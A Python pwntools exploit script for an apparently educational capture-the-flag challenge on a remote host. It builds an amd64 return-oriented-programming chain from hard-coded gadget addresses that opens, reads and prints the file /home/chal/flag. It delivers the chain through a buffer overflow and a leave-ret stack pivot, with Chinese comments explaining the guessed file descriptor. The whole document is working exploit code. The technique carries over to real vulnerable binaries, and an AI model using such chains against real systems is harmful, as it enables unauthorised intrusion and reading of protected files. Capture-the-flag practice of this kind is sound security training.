from pwn import *

context.arch = "amd64"

r = remote("edu-ctf.zoolab.org", 10005)


fn_addr = 0x4e3340
ROP_addr = 0x4e3360


pop_rdi_ret = 0x4038b3 # : pop rdi ; ret
pop_rsi_ret = 0x402428 # : pop rsi ; ret
# pop rdx; ret <- Pattern not found, use pop rdx; pop rbx; ret
# remember need to push more 8 bytes to stack
pop_rdx_ret = 0x493a2b # : pop rdx ; pop rbx ; ret
pop_rax_ret = 0x45db87 # : pop rax ; ret
syscall_ret = 0x4284b6 # : syscall ; ret
leave_ret = 0x40190c # : leave ; ret

filename = b"/home/chal/flag\x00"
# open("/home/chal/flag", 0)
# read(3, fn, 0x30)
# write(1, fn, 0x30) - stdout
ROP = flat(
    # open(fd, 0)
    pop_rdi_ret, fn_addr,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,
    
    # read(fd, buf, 0x30)
    pop_rdi_ret, 3, # guessed opened file fd
    # 這邊會猜是 fd: 3 的原因是因為 read() 預設會開 0, 1, 2 三個 fd 也就是 stdin, stdout, stderr
    # 這邊我們用的是 open() 所以 fd 會是 3
    pop_rsi_ret, fn_addr,
    pop_rdx_ret, 0x30, 0,
    pop_rax_ret, 0,
    syscall_ret,
    
    # write(1, buf, 0x30) --> stdout
    pop_rdi_ret, 1, # stdout
    pop_rax_ret, 1,
    syscall_ret,
)

s = r.recvuntil(b"Give me filename: ")
print(s)
r.send(filename)

s = r.recvuntil(b"Give me ROP: ")
print(s)
r.send(b'A'*0x8 + ROP)

s = r.recvuntil(b"Give me overflow: ")
print(s)
r.send(b'A'*0x20 + p64(ROP_addr) + p64(leave_ret))

r.interactive()
